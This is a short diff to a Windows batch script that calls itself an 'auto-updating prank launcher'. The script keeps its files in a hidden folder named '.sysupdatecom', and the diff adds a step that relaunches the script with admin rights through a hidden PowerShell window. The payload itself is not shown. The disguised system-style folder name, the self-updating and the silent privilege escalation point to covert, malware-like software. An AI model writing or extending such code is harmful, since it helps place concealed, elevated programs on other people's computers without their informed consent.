@@ -4,7 +4,18 @@ setlocal enabledelayedexpansion
 :: ============================================================
 ::   AUTO‑UPDATING PRANK LAUNCHER (single file, no Python)
 ::   Stores files in %LOCALAPPDATA%\.sysupdatecom (hidden)
+::   Automatically requests admin rights if needed
 :: ============================================================
+
+:: ---------- CHECK FOR ADMIN ----------
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    :: Not admin – relaunch with elevation
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+:: Now running as admin
+:: =====================================
 
 :: ---------- CONFIGURATION ----------
 set "BASE=%LOCALAPPDATA%\.sysupdatecom"
